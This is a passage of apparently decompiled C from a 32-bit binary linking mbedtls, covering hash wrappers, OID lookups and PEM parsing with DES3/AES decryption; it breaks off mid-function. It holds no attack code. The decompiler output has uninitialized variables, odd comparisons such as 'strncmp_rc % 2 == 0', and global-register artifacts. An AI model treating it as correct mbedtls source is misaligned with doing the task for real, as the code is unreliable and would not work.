int32_t sha384_update_wrap(int32_t a1) {
    // 0x8062b90
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_sha512_update((char *)v2, (char *)v1, a1); // 0x8062b97
    g1 = result;
    return result;
}

// Address range: 0x8062ba0 - 0x8062bcf
int32_t sha256_wrap(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = mbedtls_sha256(a1, a2, a3, 0); // 0x8062bc2
    g1 = result;
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x8062bd0 - 0x8062bff
int32_t sha224_wrap(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = mbedtls_sha256(a1, a2, a3, 1); // 0x8062bf2
    g1 = result;
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x8062c00 - 0x8062c1f
int32_t sha256_starts_wrap(int32_t a1) {
    int32_t result = mbedtls_sha256_starts((int32_t *)a1, 0); // 0x8062c14
    g1 = result;
    return result;
}

// Address range: 0x8062c20 - 0x8062c3f
int32_t sha224_starts_wrap(int32_t a1) {
    int32_t result = mbedtls_sha256_starts((int32_t *)a1, 1); // 0x8062c34
    g1 = result;
    return result;
}

// Address range: 0x8062c40 - 0x8062c4f
int32_t sha224_process_wrap(int32_t a1) {
    // 0x8062c40
    int32_t v1;
    int32_t v2;
    mbedtls_sha256_process(v2, v1);
    g1 = 8;
    return 8;
}

// Address range: 0x8062c50 - 0x8062c5f
int32_t sha224_clone_wrap(int32_t a1) {
    // 0x8062c50
    int32_t v1;
    int32_t result;
    mbedtls_sha256_clone((char *)result, (char *)v1);
    return result;
}

// Address range: 0x8062c60 - 0x8062c7f
int32_t sha224_ctx_free(int32_t a1, int32_t a2, int32_t a3) {
    // 0x8062c60
    int32_t v1;
    char * v2 = (char *)v1; // bp-4
    int32_t result = g3; // bp-8
    mbedtls_sha256_free((char *)a1);
    g3 = result;
    g2 = (int32_t)v2;
    free(v2);
    return result;
}

// Address range: 0x8062cd0 - 0x8062cdf
int32_t sha224_update_wrap(int32_t a1) {
    // 0x8062cd0
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_sha256_update((char *)v2, (char *)v1, a1); // 0x8062cd7
    g1 = result;
    return result;
}

// Address range: 0x8062ce0 - 0x8062cef
int32_t sha1_process_wrap(int32_t a1) {
    // 0x8062ce0
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_sha1_process(v2, (char *)v1); // 0x8062ce7
    g1 = result;
    return result;
}

// Address range: 0x8062cf0 - 0x8062cff
int32_t sha1_clone_wrap(int32_t a1) {
    // 0x8062cf0
    int32_t v1;
    int32_t result;
    mbedtls_sha1_clone((char *)result, (char *)v1);
    return result;
}

// Address range: 0x8062d00 - 0x8062d1f
int32_t sha1_ctx_free(int32_t a1, int32_t a2, int32_t a3) {
    // 0x8062d00
    int32_t v1;
    char * v2 = (char *)v1; // bp-4
    int32_t result = g3; // bp-8
    mbedtls_sha1_free((char *)a1);
    g3 = result;
    g2 = (int32_t)v2;
    free(v2);
    return result;
}

// Address range: 0x8062d70 - 0x8062d7f
int32_t sha1_update_wrap(int32_t a1) {
    // 0x8062d70
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_sha1_update((char *)v2, (char *)v1, a1); // 0x8062d77
    g1 = result;
    return result;
}

// Address range: 0x8062d80 - 0x8062d8f
int32_t sha1_starts_wrap(int32_t a1) {
    // 0x8062d80
    int32_t result;
    mbedtls_sha1_starts((int32_t *)result);
    return result;
}

// Address range: 0x8062d90 - 0x8062d9f
int32_t ripemd160_process_wrap(int32_t a1) {
    // 0x8062d90
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_ripemd160_process(v2, (char *)v1); // 0x8062d97
    g1 = result;
    return result;
}

// Address range: 0x8062da0 - 0x8062daf
int32_t ripemd160_clone_wrap(int32_t a1) {
    // 0x8062da0
    int32_t v1;
    int32_t result;
    mbedtls_ripemd160_clone((char *)result, (char *)v1);
    return result;
}

// Address range: 0x8062db0 - 0x8062dcf
int32_t ripemd160_ctx_free(int32_t a1, int32_t a2, int32_t a3) {
    // 0x8062db0
    int32_t v1;
    char * v2 = (char *)v1; // bp-4
    int32_t result = g3; // bp-8
    mbedtls_ripemd160_free((char *)a1);
    g3 = result;
    g2 = (int32_t)v2;
    free(v2);
    return result;
}

// Address range: 0x8062e20 - 0x8062e2f
int32_t ripemd160_update_wrap(int32_t a1) {
    // 0x8062e20
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_ripemd160_update((char *)v2, (char *)v1, a1); // 0x8062e27
    g1 = result;
    return result;
}

// Address range: 0x8062e30 - 0x8062e3f
int32_t ripemd160_starts_wrap(int32_t a1) {
    // 0x8062e30
    int32_t result;
    mbedtls_ripemd160_starts((int32_t *)result);
    return result;
}

// Address range: 0x8062e40 - 0x8062e4f
int32_t md5_process_wrap(int32_t a1) {
    // 0x8062e40
    int32_t v1;
    int32_t result;
    mbedtls_md5_process(result, (char *)v1);
    g1 = result;
    return result;
}

// Address range: 0x8062e50 - 0x8062e5f
int32_t md5_clone_wrap(int32_t a1) {
    // 0x8062e50
    int32_t v1;
    int32_t result;
    mbedtls_md5_clone((char *)result, (char *)v1);
    return result;
}

// Address range: 0x8062e60 - 0x8062e7f
int32_t md5_ctx_free(int32_t a1, int32_t a2, int32_t a3) {
    // 0x8062e60
    int32_t v1;
    char * v2 = (char *)v1; // bp-4
    int32_t result = mbedtls_md5_free((char *)a1); // 0x8062e6d
    g1 = result;
    g2 = (int32_t)v2;
    free(v2);
    return result;
}

// Address range: 0x8062ed0 - 0x8062edf
int32_t md5_update_wrap(int32_t a1) {
    // 0x8062ed0
    int32_t v1;
    int32_t v2;
    int32_t result = mbedtls_md5_update((char *)v2, (char *)v1, a1); // 0x8062ed7
    g1 = result;
    return result;
}

// Address range: 0x8062ee0 - 0x8062eef
int32_t md5_starts_wrap(int32_t a1) {
    // 0x8062ee0
    int32_t v1;
    int32_t result = mbedtls_md5_starts((int32_t *)v1); // 0x8062ee7
    g1 = result;
    return result;
}

// Address range: 0x8062ff0 - 0x806303f
int32_t mbedtls_oid_get_oid_by_md(int32_t a1, int32_t * a2, int32_t * a3, int32_t a4) {
    // 0x8063000
    if (a1 == 1) {
        // 0x8063028
        *a2 = (int32_t)&g105;
        *a3 = *(int32_t *)((int32_t)&g111 + 4);
        return 0;
    }
    int32_t v1 = (int32_t)&g111; // 0x8063015
    int32_t v2; // eax
    int32_t v3; // 0x8063018
    while (true) {
        int32_t v4 = v1 + 20; // 0x8063015
        v2 = v4;
        v3 = *(int32_t *)v4;
        if (v3 == 0) {
            // 0x806301e
            return -46;
        }
        // 0x8063010
        if (*(int32_t *)(v1 + 36) == a1) {
            // break -> 0x8063028
            break;
        }
        v1 = v4;
        // continue -> 0x8063015
    }
    // 0x8063028
    // branch -> 0x8063028
    // 0x8063028
    *a2 = v3;
    *a3 = *(int32_t *)(v2 + 4);
    return 0;
}

// Address range: 0x806314d - 0x806314f
int32_t function_806314d(int32_t a1) {
    // 0x806314d
    return g7;
}

// Address range: 0x8063150 - 0x80631cf
int32_t mbedtls_oid_get_pkcs12_pbe_alg(int32_t a1, int32_t * a2, int32_t * a3) {
    int32_t v1 = g3; // bp-16
    if (a1 == 0) {
        // 0x80631b8
        g3 = v1;
        return -46;
    }
    int32_t v2 = *(int32_t *)(a1 + 4); // 0x806316f
    int32_t v3 = (int32_t)&g110; // eax
    int32_t str = &g104;
    int32_t n = v2; // 0x8063190
    int32_t v4 = (int32_t)&g110; // 0x8063183
    // branch -> 0x8063183
    while (true) {
        int32_t v5 = v4; // 0x8063178
        if (n == *(int32_t *)(v4 + 4)) {
            uint32_t strncmp_rc = strncmp((char *)str, (char *)*(int32_t *)(a1 + 8), n);
            g4 = strncmp_rc;
            g237 = strncmp_rc % 2 == 0;
            int32_t v6 = v3; // 0x8063196
            if (strncmp_rc % 2 == 0) {
                // 0x8063196
                if (v6 == 0) {
                    // 0x80631b8
                    g3 = v1;
                    return -46;
                }
                int32_t v7 = *(int32_t *)(v6 + 16); // 0x806319d
                g4 = v7;
                *a2 = v7;
                *a3 = *(int32_t *)(v3 + 20);
                g3 = v1;
                return 0;
            }
            v5 = v6;
        }
        int32_t v8 = v5 + 24; // 0x8063178
        v3 = v8;
        int32_t v9 = *(int32_t *)v8; // 0x806317b
        g4 = v8;
        if (v9 == 0) {
            // 0x80631b8
            g3 = v1;
            return -46;
        }
        // 0x8063178
        str = v9;
        n = v2;
        v4 = v8;
        // branch -> 0x8063183
    }
}

// Address range: 0x80631d0 - 0x806323f
int32_t mbedtls_oid_get_md_alg(int32_t a1, int32_t * a2) {
    // 0x80631d0
    g4 = a1;
    int32_t v1 = g3; // bp-16
    if (a1 == 0) {
        // 0x8063230
        g3 = v1;
        return -46;
    }
    int32_t n = *(int32_t *)(a1 + 4); // 0x80631ef
    g6 = n;
    int32_t v2 = (int32_t)&g111; // eax
    int32_t str = &g105;
    int32_t v3 = (int32_t)&g111; // 0x8063203
    // branch -> 0x8063203
    while (true) {
        int32_t v4 = v3; // 0x80631f8
        if (n == *(int32_t *)(v3 + 4)) {
            uint32_t strncmp_rc = strncmp((char *)str, (char *)*(int32_t *)(a1 + 8), n);
            g4 = strncmp_rc;
            g237 = strncmp_rc % 2 == 0;
            int32_t v5 = v2; // 0x8063216
            if (strncmp_rc % 2 == 0) {
                // 0x8063216
                if (v5 == 0) {
                    // 0x8063230
                    g3 = v1;
                    return -46;
                }
                int32_t v6 = *(int32_t *)(v5 + 16); // 0x806321a
                g6 = v6;
                *a2 = v6;
                g3 = v1;
                return 0;
            }
            v4 = v5;
        }
        int32_t v7 = v4 + 20; // 0x80631f8
        v2 = v7;
        int32_t v8 = *(int32_t *)v7; // 0x80631fb
        g4 = v7;
        if (v8 == 0) {
            // 0x8063230
            g3 = v1;
            return -46;
        }
        // 0x80631f8
        str = v8;
        n = g6;
        v3 = v7;
        // branch -> 0x8063203
    }
}

// Address range: 0x8063240 - 0x80632af
int32_t mbedtls_oid_get_cipher_alg(int32_t a1, int32_t * a2) {
    int32_t v1;
    if (a1 == 0) {
        // 0x80632a0
        g2 = v1;
        return -46;
    }
    int32_t v2 = *(int32_t *)(a1 + 4); // 0x806325f
    int32_t v3 = (int32_t)&g112; // eax
    int32_t str = &g106;
    int32_t n = v2; // 0x8063280
    int32_t v4 = (int32_t)&g112; // 0x8063273
    // branch -> 0x8063273
    while (true) {
        int32_t v5 = v4; // 0x8063268
        if (n == *(int32_t *)(v4 + 4)) {
            uint32_t strncmp_rc = strncmp((char *)str, (char *)*(int32_t *)(a1 + 8), n);
            g4 = strncmp_rc;
            g237 = strncmp_rc % 2 == 0;
            int32_t v6 = v3; // 0x8063286
            if (strncmp_rc % 2 == 0) {
                // 0x8063286
                if (v6 == 0) {
                    // 0x80632a0
                    g2 = v1;
                    return -46;
                }
                // 0x806328a
                *a2 = *(int32_t *)(v6 + 16);
                g2 = v1;
                return 0;
            }
            v5 = v6;
        }
        int32_t v7 = v5 + 20; // 0x8063268
        v3 = v7;
        int32_t v8 = *(int32_t *)v7; // 0x806326b
        g4 = v7;
        if (v8 == 0) {
            // 0x80632a0
            g2 = v1;
            return -46;
        }
        // 0x8063268
        str = v8;
        n = v2;
        v4 = v7;
        // branch -> 0x8063273
    }
}

// Address range: 0x80632b0 - 0x806331f
int32_t mbedtls_oid_get_ec_grp(int32_t a1, int32_t * a2) {
    // 0x80632b0
    if (a1 == 0) {
        // 0x8063310
        return -46;
    }
    int32_t v1 = *(int32_t *)(a1 + 4); // 0x80632cf
    int32_t v2 = (int32_t)&g113; // eax
    int32_t str = &g107;
    int32_t n = v1; // 0x80632f0
    int32_t v3 = (int32_t)&g113; // 0x80632e3
    // branch -> 0x80632e3
    while (true) {
        int32_t v4 = v3; // 0x80632d8
        if (n == *(int32_t *)(v3 + 4)) {
            uint32_t strncmp_rc = strncmp((char *)str, (char *)*(int32_t *)(a1 + 8), n);
            g4 = strncmp_rc;
            g237 = strncmp_rc % 2 == 0;
            int32_t v5 = v2; // 0x80632f6
            if (strncmp_rc % 2 == 0) {
                // 0x80632f6
                if (v5 == 0) {
                    // 0x8063310
                    return -46;
                }
                // 0x80632fa
                *a2 = *(int32_t *)(v5 + 16);
                return 0;
            }
            v4 = v5;
        }
        int32_t v6 = v4 + 20; // 0x80632d8
        v2 = v6;
        int32_t v7 = *(int32_t *)v6; // 0x80632db
        g4 = v6;
        if (v7 == 0) {
            // 0x8063310
            return -46;
        }
        // 0x80632d8
        str = v7;
        n = v1;
        v3 = v6;
        // branch -> 0x80632e3
    }
}

// Address range: 0x8063320 - 0x806338f
int32_t mbedtls_oid_get_pk_alg(int32_t a1, int32_t * a2) {
    int32_t v1 = g3; // bp-16
    if (a1 == 0) {
        // 0x8063380
        g3 = v1;
        return -46;
    }
    int32_t v2 = *(int32_t *)(a1 + 4); // 0x806333f
    int32_t v3 = (int32_t)&g114; // eax
    int32_t str = &g108;
    int32_t n = v2; // 0x8063360
    int32_t v4 = (int32_t)&g114; // 0x8063353
    // branch -> 0x8063353
    while (true) {
        int32_t v5 = v4; // 0x8063348
        if (n == *(int32_t *)(v4 + 4)) {
            uint32_t strncmp_rc = strncmp((char *)str, (char *)*(int32_t *)(a1 + 8), n);
            g4 = strncmp_rc;
            g237 = strncmp_rc % 2 == 0;
            int32_t v6 = v3; // 0x8063366
            if (strncmp_rc % 2 == 0) {
                // 0x8063366
                if (v6 == 0) {
                    // 0x8063380
                    g3 = v1;
                    return -46;
                }
                // 0x806336a
                *a2 = *(int32_t *)(v6 + 16);
                g3 = v1;
                return 0;
            }
            v5 = v6;
        }
        int32_t v7 = v5 + 20; // 0x8063348
        v3 = v7;
        int32_t v8 = *(int32_t *)v7; // 0x806334b
        g4 = v7;
        if (v8 == 0) {
            // 0x8063380
            g3 = v1;
            return -46;
        }
        // 0x8063348
        str = v8;
        n = v2;
        v4 = v7;
        // branch -> 0x8063353
    }
}

// Address range: 0x80635d0 - 0x806360f
int32_t mbedtls_pem_free(char * a1) {
    int32_t v1 = (int32_t)a1; // ebx
    free((char *)*(int32_t *)a1);
    free((char *)*(int32_t *)(v1 + 8));
    g6 = v1 + 12;
    *(char *)v1 = 0;
    int32_t result = v1 + 1; // 0x80635fb
    // branch -> 0x80635f8
    while (result != g6) {
        // 0x80635f8
        *(char *)result = 0;
        result++;
        // continue -> 0x80635f8
    }
    // 0x8063602
    return result;
}

// Address range: 0x8063786 - 0x806378f
int32_t function_8063786(int32_t a1) {
    // 0x8063786
    return g7;
}

// Address range: 0x8063790 - 0x806382f
char * pem_get_iv(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g4; // 0x8063794
    int32_t v2 = g3; // 0x8063799
    memset((char *)g6, 0, v1);
    int32_t v3 = 2 * v1; // 0x80637b3
    if (v3 == 0) {
        // 0x8063800
        // branch -> 0x8063802
    } else {
        uint32_t v4 = 0; // 0x80637d4
        // branch -> 0x80637de
        while (true) {
            int32_t v5 = (int32_t)*(char *)(g1 + v4); // 0x80637de
            int32_t v6 = v5 - 48; // 0x80637e2
            int32_t v7; // 0x80637d7
            if ((char)v6 < 10) {
                // branch -> 0x80637c6
            } else {
                // 0x80637ea
                if ((char)(v5 - 65) > 5) {
                    int32_t v8 = v5 - 97; // 0x8063810
                    g4 = v8;
                    if ((char)v8 > 5) {
                        // 0x8063802
                        g3 = v2;
                        return (char *)-0x1200;
                    }
                    // 0x8063818
                    v6 = v5 - 87;
                    // branch -> 0x80637c6
                } else {
                    // 0x80637f2
                    v6 = v5 - 55;
                    // branch -> 0x80637c6
                }
                // 0x80637c6
                v7 = v6;
                if (v4 % 2 == 0) {
                  lab_if_80637cd_0_true:
                    // if_80637cd_0_true
                    v7 = 16 * v6;
                    // branch -> after_if_80637cd_0
                }
              lab_after_if_80637cd_0:;
                int32_t v9 = v4 / 2; // 0x80637d2
                g4 = v9;
                char * v10 = (char *)(g6 + v9); // 0x80637d7_0
                *v10 = (char)((int32_t)*v10 | v7);
                int32_t v11 = v4 + 1; // 0x80637da
                if (v11 >= v3) {
                    // break -> 0x8063800
                    break;
                }
                v4 = v11;
                // continue -> 0x80637de
                continue;
            }
            // 0x80637c6
            if (v4 % 2 == 0) {
                goto lab_if_80637cd_0_true;
            }
            v7 = v6;
            goto lab_after_if_80637cd_0;
        }
        // 0x8063800
        // branch -> 0x8063802
    }
    // 0x8063802
    g3 = v2;
    return (char *)0;
}

// Address range: 0x8063830 - 0x806384f
int32_t mbedtls_pem_init(int32_t * a1) {
    int32_t result = (int32_t)a1;
    *a1 = 0;
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 8) = 0;
    return result;
}

// Address range: 0x8063850 - 0x80639bc
int32_t pem_pbkdf1(char * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = g5; // 0x8063853
    int32_t v2 = g7; // 0x8063854
    int32_t v3 = g3; // bp-16
    g3 = g1;
    int32_t v4;
    g7 = &v4;
    int32_t v5 = g6; // 0x8063861
    int32_t v6;
    g5 = &v6;
    int32_t v7 = g4; // 0x806386a
    mbedtls_md5_init((char *)&v4);
    mbedtls_md5_starts((int32_t *)g7);
    g1 = (int32_t)a1;
    mbedtls_md5_update((char *)g7, a1, a2);
    g1 = v7;
    char * v8 = (char *)v7;
    mbedtls_md5_update((char *)g7, v8, 8);
    mbedtls_md5_finish((int32_t *)g7, (char *)g5);
    int32_t v9;
    if (v5 <= 16) {
        // 0x80638c7
        memcpy((char *)g3, (char *)g5, v5);
        mbedtls_md5_free((char *)g7);
        int32_t result = &v9; // 0x80638df_0
        *(char *)g5 = 0;
        int32_t v10 = g5 + 1; // 0x80638eb
        g5 = v10;
        // branch -> 0x80638e8
        while (v10 != result) {
            // 0x80638e8
            *(char *)v10 = 0;
            v10 = g5 + 1;
            g5 = v10;
            // continue -> 0x80638e8
        }
        // 0x80638f2
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return result;
    }
    // 0x8063900
    *(int32_t *)g3 = v6;
    int32_t v11;
    *(int32_t *)(g3 + 4) = v11;
    int32_t v12;
    *(int32_t *)(g3 + 8) = v12;
    int32_t v13;
    *(int32_t *)(g3 + 12) = v13;
    g1 = mbedtls_md5_starts((int32_t *)g7);
    mbedtls_md5_update((char *)g7, (char *)g5, 16);
    g1 = (int32_t)a1;
    mbedtls_md5_update((char *)g7, a1, a2);
    g1 = v7;
    mbedtls_md5_update((char *)g7, v8, 8);
    mbedtls_md5_finish((int32_t *)g7, (char *)g5);
    int32_t v14 = 16; // 0x8063990
    if (v5 < 32) {
        // if_806398a_0_true
        v14 = v5 - 16;
        // branch -> after_if_806398a_0
    }
    // after_if_806398a_0
    memcpy((char *)(g3 + 16), (char *)g5, v14);
    mbedtls_md5_free((char *)g7);
    int32_t result2 = &v9; // 0x80639a4_0
    *(char *)g5 = 0;
    int32_t v15 = g5 + 1; // 0x80639ab
    g5 = v15;
    // branch -> 0x80639a8
    while (v15 != result2) {
        // 0x80639a8
        *(char *)v15 = 0;
        v15 = g5 + 1;
        g5 = v15;
        // continue -> 0x80639a8
    }
    // 0x80639b2
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return result2;
}

// Address range: 0x80639bd - 0x80639bf
int32_t function_80639bd(int32_t a1) {
    // 0x80639bd
    return g7;
}

// Address range: 0x80639c0 - 0x8063a75
int32_t pem_aes_decrypt(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = g5; // 0x80639c3
    int32_t v2 = g7; // 0x80639c4
    int32_t v3 = g3; // 0x80639c5
    g3 = g6;
    int32_t v4;
    g7 = &v4;
    int32_t v5 = g1; // 0x80639d4
    int32_t v6;
    int32_t v7 = &v6; // 0x80639da_0
    g5 = v7;
    int32_t v8 = g4; // 0x80639dd
    mbedtls_aes_init((char *)&v4);
    g6 = g3;
    g4 = v5;
    g1 = v7;
    int32_t v9;
    int32_t v10;
    int32_t v11;
    pem_pbkdf1((char *)a2, a3, v11, v10, v9);
    mbedtls_aes_setkey_dec((int32_t *)g7, g5, 8 * g3);
    mbedtls_aes_crypt_cbc(g7, 0, (char)a1, (int32_t *)v5, v8, v8);
    int32_t result = mbedtls_aes_free((char *)g7); // 0x8063a50
    g1 = result;
    int32_t v12;
    if (g3 == 0) {
        // 0x8063a6b
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v12;
        return result;
    }
    // 0x8063a60
    *(char *)g5 = 0;
    int32_t v13 = g5 + 1; // 0x8063a63
    g5 = v13;
    int32_t v14 = g3 - 1; // 0x8063a66
    g3 = v14;
    // branch -> 0x8063a60
    while (v14 != 0) {
        // 0x8063a60
        *(char *)v13 = 0;
        v13 = g5 + 1;
        g5 = v13;
        v14 = g3 - 1;
        g3 = v14;
        // continue -> 0x8063a60
    }
    // 0x8063a6b
    g3 = v3;
    g7 = v2;
    g5 = v1;
    g2 = v12;
    return result;
}

// Address range: 0x8063a76 - 0x8063a7f
int32_t function_8063a76(int32_t a1) {
    // 0x8063a76
    return g7;
}

// Address range: 0x8063a80 - 0x806405f
int32_t mbedtls_pem_read_buffer(int32_t * a1, char * str2, char * str3, int32_t str, int32_t a5, int32_t a6, int32_t * a7) {
    int32_t v1 = g3; // 0x8063a8e
    g3 = (int32_t)a1;
    int32_t v2 = g7; // 0x8063a94
    g7 = str;
    int32_t v3 = g5; // 0x8063a9a
    if (a1 == NULL) {
        // 0x8063aa4
        g3 = v1;
        g7 = v2;
        g5 = v3;
        return -0x1480;
    }
    char * substr_pos = strstr((char *)str, str2); // 0x8063abf
    if (substr_pos == NULL) {
        // 0x8063aca
        g3 = v1;
        g7 = v2;
        g5 = v3;
        return -0x1080;
    }
    char * substr_pos2 = strstr((char *)g7, str3); // 0x8063af0
    int32_t v4 = (int32_t)substr_pos2; // 0x8063af0_5
    if (substr_pos2 <= substr_pos) {
        // 0x8063aca
        g3 = v1;
        g7 = v2;
        g5 = v3;
        return -0x1080;
    }
    // 0x8063b05
    if (substr_pos2 != NULL) {
        int32_t v5 = strlen((char *)(int32_t)str2) + (int32_t)substr_pos; // 0x8063b17
        unsigned char v6 = *(char *)v5; // 0x8063b19
        int32_t v7 = v5; // 0x8063ce2
        int32_t v8 = v6; // 0x8063b24
        if (v6 == 32) {
            int32_t v9 = v5 + 1; // 0x8063ced
            v7 = v9;
            v8 = (int32_t)*(char *)v9;
            // branch -> 0x8063b24
        }
        int32_t v10 = v7; // 0x8063b38
        int32_t v11 = v8; // 0x8063b2c
        if (v8 == 13) {
            int32_t v12 = v7 + 1; // 0x8063ce2
            v10 = v12;
            v11 = (int32_t)*(char *)v12;
            // branch -> 0x8063b2c
        }
        // 0x8063b2c
        if (v11 % 256 == 10) {
            int32_t str4 = v10 + 1; // edx
            g5 = v4;
            int32_t v13 = strlen(str3) + v4; // 0x8063b45
            unsigned char v14 = *(char *)v13; // 0x8063b49
            int32_t v15 = v13; // 0x8063b5c
            int32_t v16 = v14; // 0x8063b57
            if (v14 == 32) {
                int32_t v17 = v13 + 1; // 0x8063b51
                v15 = v17;
                v16 = (int32_t)*(char *)v17;
                // branch -> 0x8063b57
            }
            int32_t v18 = v15; // 0x8063b6b
            int32_t v19 = v16; // 0x8063b62
            if (v16 == 13) {
                int32_t v20 = v15 + 1; // 0x8063b5c
                v18 = v20;
                v19 = (int32_t)*(char *)v20;
                // branch -> 0x8063b62
            }
            // 0x8063b62
            g4 = (int32_t)a7;
            *a7 = (int32_t)(v19 % 256 == 10) + v18 - g7;
            int32_t v21; // 0x8063f4f
            int32_t v22; // 0x8064018
            int32_t v23; // 0x8063bdd_0
            int32_t v24; // 0x8063ef6_0
            int32_t v25; // 0x8063fac_0
            int32_t v26; // 0x8063fca_0
            char * mem; // 0x8063c0d
            int32_t v27;
            int32_t size;
            int32_t v28;
            int32_t v29;
            int32_t v30;
            int32_t v31;
            int32_t v32;
            int32_t v33; // 0x8063bd1
            int32_t v34; // 0x8063c6a
            int32_t v35; // 0x8063c2d
            int32_t v36; // 0x8063f22
            int32_t v37; // 0x8063fea
            if (memcmp((char *)str4, "Proc-Type: 4,ENCRYPTED", 22) == 0) {
                int32_t v38 = str4 + 22; // 0x8063d02
                unsigned char v39 = *(char *)v38; // 0x8063d0b
                int32_t v40 = v39; // 0x8063d20
                if (v39 == 13) {
                    int32_t v41 = str4 + 23; // 0x8063d13
                    g5 = v41;
                    v40 = (int32_t)*(char *)v41;
                    v38 = v41;
                    // branch -> 0x8063d20
                }
                // 0x8063d20
                if (v40 == 10) {
                    int32_t v42 = v38 + 1; // 0x8063d3a
                    g7 = v42;
                    char * str5 = (char *)v42;
                    int32_t v43; // 0x8063e29
                    int32_t v44; // 0x8063ea2
                    int32_t memcmp_rc; // 0x8063da7
                    char * v45; // bp-652
                    char * str7;
                    char * str8;
                    char * str9;
                    char * v46;
                    char * v47;
                    unsigned char v48; // 0x8063e22
                    int32_t v49;
                    int32_t v50; // 0x8063e29
                    int32_t v51; // 0x8063e2f
                    int32_t v52; // 0x8063e37
                    if (memcmp(str5, "DEK-Info: DES-EDE3-CBC,", 23) == 0) {
                        // 0x8063e49
                        g6 = &v28;
                        g4 = 8;
                        g1 = v38 + 24;
                        if (pem_get_iv((int32_t)str5, (int32_t)"DEK-Info: DES-EDE3-CBC,", 23) == NULL) {
                            // 0x8063e63
                            g5 = 37;
                            int32_t str6 = v38 + 40; // 0x8063e6e
                            g7 = str6;
                            // branch -> 0x8063d6f
                            // 0x8063d6f
                            int32_t v53; // 0x8063cb7
                            if (memcmp((char *)str6, "DEK-Info: AES-", 14) == 0) {
                                // 0x8063d8f
                                g5 = 5;
                                str7 = (char *)g7;
                                v45 = str7;
                                memcmp_rc = memcmp(str7, "DEK-Info: AES-128-CBC,", 22);
                                v46 = "DEK-Info: AES-128-CBC,";
                                if (memcmp_rc != 0) {
                                    // 0x8063db0
                                    g5 = g5 & -0x10000 | 6;
                                    str8 = (char *)g7;
                                    v45 = str8;
                                    if (memcmp(str8, "DEK-Info: AES-192-CBC,", 22) != 0) {
                                        // 0x8063dd0
                                        str9 = (char *)g7;
                                        if (memcmp(str9, "DEK-Info: AES-256-CBC,", 22) != 0) {
                                            // 0x8063dec
                                            // branch -> 0x8063aa4
                                            // 0x8063aa4
                                            g3 = v1;
                                            g7 = v2;
                                            g5 = v3;
                                            return -0x1280;
                                        }
                                        // 0x8063df6
                                        g5 = g5 & -0x10000 | 7;
                                        v46 = "DEK-Info: AES-256-CBC,";
                                        // branch -> 0x8063dfa
                                        // 0x8063dfa
                                        g1 = g7 + 22;
                                        g4 = 16;
                                        g6 = &v28;
                                        int32_t result; // 0x8063ab0_2
                                        if (pem_get_iv((int32_t)str9, (int32_t)v46, 22) == NULL) {
                                            // 0x8063ea2
                                            v44 = g7 + 54;
                                            g7 = v44;
                                            v50 = v44;
                                            // branch -> 0x8063e22
                                            // 0x8063e22
                                            v48 = *(char *)v50;
                                            v52 = v50;
                                            v51 = v48;
                                            if (v48 == 13) {
                                                // 0x8063e29
                                                v43 = v50 + 1;
                                                g7 = v43;
                                                v52 = v43;
                                                v51 = (int32_t)*(char *)v43;
                                                // branch -> 0x8063e2f
                                            }
                                            // 0x8063e2f
                                            if (v51 == 10) {
                                                // 0x8063e37
                                                v35 = v52 + 1;
                                                // branch -> 0x8063bac
                                                // 0x8063bac
                                                if (v4 != v35) {
                                                    // 0x8063bb8
                                                    v33 = v4 - v35;
                                                    v23 = &size;
                                                    mbedtls_base64_decode(NULL, 0, &size, v35, v33);
                                                    g4 = v23;
                                                    if (&size == (int32_t *)-44) {
                                                        // 0x8063aa4
                                                        g3 = v1;
                                                        g7 = v2;
                                                        g5 = v3;
                                                        return -0x112c;
                                                    }
                                                    // 0x8063bff
                                                    mem = calloc(1, size);
                                                    g7 = (int32_t)mem;
                                                    if (mem == NULL) {
                                                        // 0x8063aa4
                                                        g3 = v1;
                                                        g7 = v2;
                                                        g5 = v3;
                                                        return -0x1180;
                                                    }
                                                    int32_t v54 = mbedtls_base64_decode(mem, size, &size, v35, v33); // 0x8063c46
                                                    if (v54 != 0) {
                                                        // 0x8064042
                                                        free((char *)g7);
                                                        // branch -> 0x8063aa4
                                                        // 0x8063aa4
                                                        g3 = v1;
                                                        g7 = v2;
                                                        g5 = v3;
                                                        return v54 - 0x1100;
                                                    }
                                                    // 0x8063c60
                                                    if (a5 == 0) {
                                                        // 0x8064028
                                                        free((char *)g7);
                                                        // branch -> 0x8063aa4
                                                    } else {
                                                        // 0x8063c6a
                                                        v34 = g5;
                                                        if (v34 == 37) {
                                                            // 0x8063f95
                                                            g5 = &v29;
                                                            mbedtls_des3_init((char *)&v29);
                                                            v25 = &v28;
                                                            g4 = v25;
                                                            g6 = 24;
                                                            v26 = &v32;
                                                            g1 = v26;
                                                            pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                            mbedtls_des3_set3key_dec(g5, v26);
                                                            g4 = v26;
                                                            v37 = g7;
                                                            mbedtls_des3_crypt_cbc(g5, 0, (char)size, &v28, v37, v37);
                                                            mbedtls_des3_free((char *)g5);
                                                            *(char *)v26 = 0;
                                                            v22 = v26 + 1;
                                                            // branch -> 0x8064015
                                                            while (v22 != v25) {
                                                                // 0x8064015
                                                                *(char *)v22 = 0;
                                                                v22++;
                                                                // continue -> 0x8064015
                                                            }
                                                            // 0x8063cb7
                                                            v53 = size;
                                                            v49 = g7;
                                                            v47 = (char *)v49;
                                                            if (v53 >= 3) {
                                                                // 0x8063cc3
                                                                if (*v47 == 48) {
                                                                    // 0x8063ccc
                                                                    if (*(char *)(v49 + 1) <= 131) {
                                                                        // 0x8063cd6
                                                                        *(int32_t *)(g3 + 4) = v53;
                                                                        *(int32_t *)g3 = g7;
